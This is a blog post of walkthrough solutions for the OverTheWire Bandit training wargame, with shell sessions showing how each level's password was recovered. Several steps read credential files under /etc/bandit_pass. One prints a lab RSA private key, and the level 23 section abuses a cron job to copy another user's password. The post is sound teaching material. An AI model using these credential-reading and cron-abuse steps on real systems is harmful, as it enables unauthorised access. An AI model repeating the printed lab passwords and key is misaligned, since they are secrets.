+++
Title = "OverTheWire.org – Bandit Solutions"
Date = "2015-05-05"
Tags = [ "Security", "Hacking", "OverTheWire" ]
Categories = [ "Hacking" ]
Description = "Solutions for the wargame 'Bandit' from 'OverTheWire.org'."
+++

It's been a while since I've begin to complete wargames proposed by [OverTheWire.org](http://overthewire.org).
So, I propose you [Bandit](http://overthewire.org/wargames/bandit/), first game of OverTheWire.
<!--more-->

### Bandit, the basic of basics
Being the first game of OverTheWire.org, it teaches you the basics of Linux systems access and functioning.

**You should really try to solve these problems by yourself before reading solutions.
Research is the best way to learn !**

#### Connections to levels
To log into the level X, you have to execute the following command :

    banditX@bandit.labs.overthewire.org

### Solutions

#### Level 0 to level 1

    bandit0@melinda:~$ cat readme
    boJ9jbbUNNfktd78OOpsqOltutMc3MY1

#### Level 1 to level 2

    bandit1@melinda:~$ cat ./-
    CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

#### Level 2 to level 3

    bandit2@melinda:~$ cat ./spaces\ in\ this\ filename
    UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

#### Level 3 to level 4

    bandit3@melinda:~$ ls
    inhere
    bandit3@melinda:~$ cd inhere/
    bandit3@melinda:~/inhere$ ls -a
    .  ..  .hidden
    bandit3@melinda:~/inhere$ cat ./.hidden
    pIwrPrtPN36QITSp3EQaw936yaFoFgAB

#### Level 4 to level 5

    bandit4@melinda:~$ ls
    inhere
    bandit4@melinda:~$ cd inhere/
    bandit4@melinda:~/inhere$ ls
    -file00  -file02  -file04  -file06  -file08
    -file01  -file03  -file05  -file07  -file09
    bandit4@melinda:~/inhere$ file ./-*
    ./-file00: data
    ./-file01: data
    ./-file02: data
    ./-file03: data
    ./-file04: data
    ./-file05: data
    ./-file06: data
    ./-file07: ASCII text
    ./-file08: data
    ./-file09: data
    bandit4@melinda:~/inhere$ cat ./-file07
    koReBOKuIDDepwhWk7jZC0RTdopnAYKh

#### Level 5 to level 6

    bandit5@melinda:~$ cd inhere/
    bandit5@melinda:~/inhere$ find ./ -size 1033c
    ./maybehere07/.file2
    bandit5@melinda:~/inhere$ cat ./maybehere07/.file2
    DXjZPULLxYr17uwoI01bNLQbtFemEgo7

#### Level 6 to level 7

    bandit6@melinda:~$ find / -user bandit7 -group bandit6
    ...
    /var/lib/dpkg/info/bandit7.password
    ...
    bandit6@melinda:~$ cat /var/lib/dpkg/info/bandit7.password
    HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

#### Level 7 to level 8

    bandit7@melinda:~$ cat data.txt | grep millionth
    millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV

#### Level 8 to level 9

    bandit8@melinda:~$ cat data.txt | sort | uniq -u
    UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

#### Level 9 to level 10

    bandit9@melinda:~$ strings data.txt | grep '^='
    ========== password
    ========== ism
    ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

#### Level 10 to level 11

    bandit10@melinda:~$ base64 -d data.txt
    The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

#### Level 11 to level 12

    bandit11@melinda:~$ cat data.txt | tr [A-Za-z] [N-ZA-Mn-za-m]
    The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

#### Level 12 to 13

    bandit12@melinda:~$ mkdir /tmp/lerenn
    bandit12@melinda:~$ cp data.txt /tmp/lerenn
    bandit12@melinda:~$ cd /tmp/lerenn
    bandit12@melinda:/tmp/lerenn$ xxd -r data.txt > data.bin
    bandit12@melinda:/tmp/lerenn$ file data.bin
    data.bin: gzip compressed data, was "data2.bin", from Unix
    bandit12@melinda:/tmp/lerenn$ cp data.bin data.gz
    bandit12@melinda:/tmp/lerenn$ gzip -d data.gz > data
    bandit12@melinda:/tmp/lerenn$ file data
    data: bzip2 compressed data, block size = 900k
    bandit12@melinda:/tmp/lerenn$ mv data data.bz2
    bandit12@melinda:/tmp/lerenn$ bzip2 -d data.bz2
    bandit12@melinda:/tmp/lerenn$ file data
    data: gzip compressed data, was "data4.bin", from Unix
    bandit12@melinda:/tmp/lerenn$ mv data data.gz
    bandit12@melinda:/tmp/lerenn$ gzip -d data.gz
    bandit12@melinda:/tmp/lerenn$ mv data data.tar
    bandit12@melinda:/tmp/lerenn$ tar -xf data.tar
    bandit12@melinda:/tmp/lerenn$ file data5.bin
    data5.bin: POSIX tar archive (GNU)
    bandit12@melinda:/tmp/lerenn$ mv data5.bin data5.tar
    bandit12@melinda:/tmp/lerenn$ tar -xf data5.tar
    bandit12@melinda:/tmp/lerenn$ file data6.bin
    data6.bin: bzip2 compressed data, block size = 900k
    bandit12@melinda:/tmp/lerenn$ mv data6.bin data6.bz2
    bandit12@melinda:/tmp/lerenn$ bzip2 -d data6.bz2
    bandit12@melinda:/tmp/lerenn$ file data6
    data6: POSIX tar archive (GNU)
    bandit12@melinda:/tmp/lerenn$ mv data6 data7.tar
    bandit12@melinda:/tmp/lerenn$ tar -xf data7.tar
    bandit12@melinda:/tmp/lerenn$ file data8.bin
    data8.bin: gzip compressed data, was "data9.bin", from Unix
    bandit12@melinda:/tmp/lerenn$ mv data8.bin data8.gz
    bandit12@melinda:/tmp/lerenn$ gzip -d data8.gz
    bandit12@melinda:/tmp/lerenn$ file data8
    data8: ASCII text
    bandit12@melinda:/tmp/lerenn$ cat data8
    The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

#### Level 13 to 14

	bandit13@melinda:~$ ssh bandit14@localhost -i sshkey.private
	[...]
	bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

#### Level 14 to 15

	bandit14@melinda:~$ echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e" | nc localhost 30000
	Correct!
	BfMYroe26WYalil77FoDi9qh59eK5xNr

#### Level 15 to 16

	bandit15@melinda:~$ echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -connect localhost:30001 -quiet
	depth=0 CN = li190-250.members.linode.com
	verify error:num=18:self signed certificate
	verify return:1
	depth=0 CN = li190-250.members.linode.com
	verify return:1
	Correct!
	cluFn7wTiGryunymYOu4RcffSxQluehd

	read:errno=0

#### Level 16 to 17

	bandit16@melinda:~$ nmap localhost -p 31000-32000

	Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-05 16:56 UTC
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.00077s latency).
	Not shown: 996 closed ports
	PORT      STATE SERVICE
	31046/tcp open  unknown
	31518/tcp open  unknown
	31691/tcp open  unknown
	31790/tcp open  unknown
	31960/tcp open  unknown

	Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
	bandit16@melinda:~$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -connect localhost:31790 -quiet
	depth=0 CN = li190-250.members.linode.com
	verify error:num=18:self signed certificate
	verify return:1
	depth=0 CN = li190-250.members.linode.com
	verify return:1
	Correct!
	-----BEGIN RSA PRIVATE KEY-----
	MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
	imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
	Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
	DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
	JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
	x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
	KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
	J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
	d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
	YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
	vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
	+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
	8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
	SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
	HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
	SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
	R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
	Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
	R8VdwSk8r9FGLS+9aKcV5PI/WEKilwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
	L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
	blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
	YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
	77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
	dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
	vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
	-----END RSA PRIVATE KEY-----

	read:errno=0

#### Level 17 to 18

	bandit17@melinda:~$ diff passwords.new passwords.old
	42c42
	< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
	---
	> BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR

#### Level 18 to 19

	[user@computer]$ echo "cat readme" | ssh bandit18@bandit.labs.overthewire.org
	[ ... ]
	IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

#### Level 19 to 20

	bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j

#### Level 20 to 21

Pour ce level, vous allez avoir besoin de 2 shells. Voici les étapes:

	# Premier shell
	bandit20@melinda:~$ nc -l 1337

	# Deuxième shell
	bandit20@melinda:~$ ./suconnect 1337

	# Premier shell : Entrez le password et appuyez sur entrée
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
	gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

	# Voici ce qui s'affiche sur le deuvième shell
	Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
	Password matches, sending next password

#### Level 21 to 22

	bandit21@melinda:~$ ls /etc/cron.d
	behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24       leviathan5_cleanup    melinda-stats          natas-stats      natas25_cleanup~  natas27_cleanup  semtex0-32  semtex0-ppc  sysstat  vortex20
	cron-apt           cronjob_bandit23  cronjob_bandit24_root  manpage3_resetpw_job  natas-session-toucher  natas25_cleanup  natas26_cleanup   php5             semtex0-64  semtex5      vortex0
	bandit21@melinda:~$ cat /usr/bin/cronjob_bandit22.sh
	#!/bin/bash
	chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

#### Level 22 to 23

	bandit22@melinda:~$ ls /etc/cron.d
	behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24       leviathan5_cleanup    melinda-stats          natas-stats      natas25_cleanup~  natas27_cleanup  semtex0-32  semtex0-ppc  sysstat  vortex20
	cron-apt           cronjob_bandit23  cronjob_bandit24_root  manpage3_resetpw_job  natas-session-toucher  natas25_cleanup  natas26_cleanup   php5             semtex0-64  semtex5      vortex0
	bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
	* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
	bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
	#!/bin/bash

	myname=$(whoami)
	mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

	echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

	cat /etc/bandit_pass/$myname > /tmp/$mytarget
	bandit22@melinda:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
	8ca319486bfbbc3663ea0fbe81326349
	bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

#### Level 23 to 24

	bandit23@melinda:~$ ls /etc/cron.d
	behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24       leviathan5_cleanup    melinda-stats          natas-stats      natas25_cleanup~  natas27_cleanup  semtex0-32  semtex0-ppc  sysstat  vortex20
	cron-apt           cronjob_bandit23  cronjob_bandit24_root  manpage3_resetpw_job  natas-session-toucher  natas25_cleanup  natas26_cleanup   php5             semtex0-64  semtex5      vortex0
	bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
	* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
	bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
	#!/bin/bash

	myname=$(whoami)

	cd /var/spool/$myname
	echo "Executing and deleting all scripts in /var/spool/$myname:"
	for i in * .*;
	do
	    if [ "$i" != "." -a "$i" != ".." ];
	    then
		echo "Handling $i"
		timeout -s 9 60 "./$i"
		rm -f "./$i"
	    fi
	done


	bandit23@melinda:~$ mkdir /tmp/getmdp
	bandit23@melinda:~$ cd /tmp/getmdp
	bandit23@melinda:/tmp/getmdp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/getmdp/mdp" >> script.sh
	bandit23@melinda:/tmp/getmdp$ chmod -R 777 ./
	bandit23@melinda:/tmp/getmdp$ cp /tmp/getmdp/script.sh /var/spool/bandit24/
	bandit23@melinda:/tmp/getmdp$ ls
	mdp  script.sh
	bandit23@melinda:/tmp/getmdp$ cat mdp
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ


#### Level 24 to 27

Following soon !
